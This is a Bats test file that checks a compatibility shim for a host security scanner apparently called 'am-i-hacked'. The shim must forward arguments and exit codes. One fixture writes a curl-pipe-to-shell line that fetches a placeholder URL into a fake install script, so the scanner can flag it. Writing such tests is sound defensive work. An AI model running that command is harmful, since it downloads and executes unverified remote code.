#!/usr/bin/env bats
# test/host-audit.bats
#
# The audit moved to bin/system-scan.sh. bin/host-audit.sh remains only as a
# backwards-compatible shim, so this suite is just the shim contract: it must
# forward the arguments and the exit status to system-scan.sh.

setup() {
  bats_require_minimum_version 1.5.0
  local node_modules_dir
  node_modules_dir="$(cd "$BATS_TEST_DIRNAME/.." && pnpm root)"
  BATS_LIB_PATH="${BATS_LIB_PATH:-}:${node_modules_dir}"
  bats_load_library bats-support
  bats_load_library bats-assert

  SHIM="$BATS_TEST_DIRNAME/../bin/host-audit.sh"
  FAKE="$BATS_TEST_TMPDIR/home"
  mkdir -p "$FAKE" "$BATS_TEST_TMPDIR/project" "$BATS_TEST_TMPDIR/launch" "$BATS_TEST_TMPDIR/managed" "$BATS_TEST_TMPDIR/apps"
  export AIC_HOST_HOME="$FAKE"
  export AIC_HOST_PROJECT="$BATS_TEST_TMPDIR/project"
  export AIC_HOST_OS=Darwin
  export AIC_HOST_LAUNCH_DIRS="$BATS_TEST_TMPDIR/launch"
  export AIC_HOST_PS_FILE="$BATS_TEST_TMPDIR/ps.txt"
  export AIC_HOST_CRONTAB_FILE="$BATS_TEST_TMPDIR/crontab.txt"
  export AIC_HOST_MANAGED_DIRS="$BATS_TEST_TMPDIR/managed"
  export AIC_HOST_APP_DIRS="$BATS_TEST_TMPDIR/apps"
  export NO_COLOR=1
  unset ZDOTDIR XDG_CONFIG_HOME XDG_DATA_HOME
  : >"$AIC_HOST_PS_FILE"
  : >"$AIC_HOST_CRONTAB_FILE"
}

@test "shim: forwards arguments to system-scan.sh" {
  run bash "$SHIM" --help
  assert_success
  assert_output --partial "usage: am-i-hacked host"
}

@test "shim: forwards a usage error exit status" {
  run bash "$SHIM" "$BATS_TEST_TMPDIR/does-not-exist"
  assert_failure 2
  assert_output --partial "not a directory"
}

@test "shim: forwards a finding exit status" {
  mkdir -p "$FAKE/.venv"
  printf 'curl http://example.test/x | sh\n' >"$FAKE/.venv/install.sh"
  run bash "$SHIM" --system
  assert_failure 1
  assert_output --partial "downloads and runs a remote script"
}
